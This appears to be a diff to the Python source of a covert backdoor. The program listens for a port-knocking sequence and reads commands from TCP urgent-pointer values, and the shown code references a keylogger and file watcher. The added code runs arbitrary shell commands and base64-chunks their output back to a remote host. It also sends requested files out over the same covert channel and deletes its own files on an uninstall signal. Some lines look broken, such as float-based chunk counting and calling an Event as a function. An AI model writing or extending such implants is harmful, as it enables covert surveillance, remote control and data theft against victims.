@@ -46,6 +46,7 @@ knock_sequence = [3434, 4545, 5656]
 knock_index = 0
 communication_port = 80
 ack_event = threading.Event()
+stop_sniff = threading.Event()
 sniff_thread = None
 timeout = 10  # Timeout in seconds for acknowledgment
 knock_ip = None
@@ -102,6 +103,8 @@ def handle_chunk_timeout():
 
 def signal_callback(packet):
     """Callback function to process each sniffed packet for signals."""
+    if stop_sniff.is_set():
+        raise Exception("Stop requested")  # Exit the sniff thread
     global current_signal, received_data, signal_received, received_chunks, chunk_timer
     if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
         urgent_pointer_value = packet[TCP].urgptr
@@ -184,12 +187,27 @@ def handle_initial_signal():
             print("File grabber signal received.")
         case 7:
             print("Run program signal received.")
+            # Run command in a terminal subprocess end send each newline printed back
         case 8:
             print("Exit signal received.")
-            # reset, stop sniffer thread then start wait for pport knocking
+            # reset, stop sniffer thread then start wait for port knocking
+            stop_sniff()
+            reset_state()
+            wait_for_port_knocking()
             
         case 9:
             print("Uninstall signal received.")
+            # Stop all processes delete all python files and close terminal
+            stop_sniff()
+            for filename in os.listdir("."):
+                if filename.endswith(("dashboard.py", "encoder.py", "handler.py", "logger.py", "watcher.py")):
+                    try:
+                        os.remove(filename)
+                        print(f"Deleted: {filename}")
+                    except Exception as e:
+                        print(f"Failed to delete {filename}: {e}")
+            os._exit(0)
+
 
 def start_keylogger():
     """Start the keylogger process."""
@@ -228,6 +246,36 @@ def send_log_file():
     else:
         print("Log file not found.")
 
+def run_program(file_path):
+    try:
+        # Execute command
+        result = subprocess.run(
+            file_path,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            timeout=30
+        )
+        output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
+        
+        # Base64 encode and chunk
+        encoded = base64.b64encode(output.encode()).decode()
+        total_chunks = (len(encoded) / 16)
+        
+        # Send each chunk
+        for i in range(total_chunks):
+            chunk = encoded[i*16:(i+1)*16]
+            os.system(f'python3 encoder.py PT:{dest_ip} "{chunk}')
+            
+    except Exception as e:
+        subprocess.run([
+            "python3", "encoder.py",
+            f"CMD:{dest_ip}",
+            f"ERROR:{str(e)}"
+        ])
+
+
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
     global current_signal
@@ -238,6 +286,13 @@ def handle_data(decoded_data):
             decoded_data = decoded_data.decode('utf-8')
             print(f"Watcher command received: {decoded_data}")
             start_watcher(decoded_data)
+        case 6:
+            decoded_data = decoded_data.decode('utf-8')
+            print(f"Sending File")
+            os.system(f'python3 encoder.py FT:{dest_ip} "{decoded_data}"')
+        case 7:
+            run_program(decoded_data)
+
     reset_state()
 
 def save_file(decoded_data):
@@ -275,12 +330,30 @@ def reset_state():
     print("State reset.")
     wait_for_signal()
 
+def stop_sniffing():
+    """Stop the sniff thread gracefully."""
+    global stop_sniff, sniff_thread
+    if sniff_thread and sniff_thread.is_alive():
+        print("Stopping sniff thread...")
+        stop_sniff.set()  # Signal the thread to exit
+        sniff_thread.join(timeout=2)  # Wait up to 2 seconds for clean exit
+        if sniff_thread.is_alive():
+            print("Warning: Thread did not exit cleanly!")
+        stop_sniff.clear()  # Reset for future use
+
 def wait_for_signal():
     """Wait for a signal after port-knocking sequence."""
     print("Waiting for signal...")
     global sniff_thread
     if not sniff_thread or not sniff_thread.is_alive():
-        sniff_thread = threading.Thread(target=sniff, kwargs={'filter': f"tcp and dst host {local_ip}", 'prn': signal_callback, 'store': 0})
+        sniff_thread = threading.Thread(
+            target=lambda: sniff(
+                filter=f"tcp and dst host {local_ip}",
+                prn=signal_callback,
+                store=0,
+                stop_filter=lambda _: stop_sniff.is_set()  # Exit if stop_sniff is set
+            )
+        )
         sniff_thread.start()
 
 def wait_for_port_knocking():
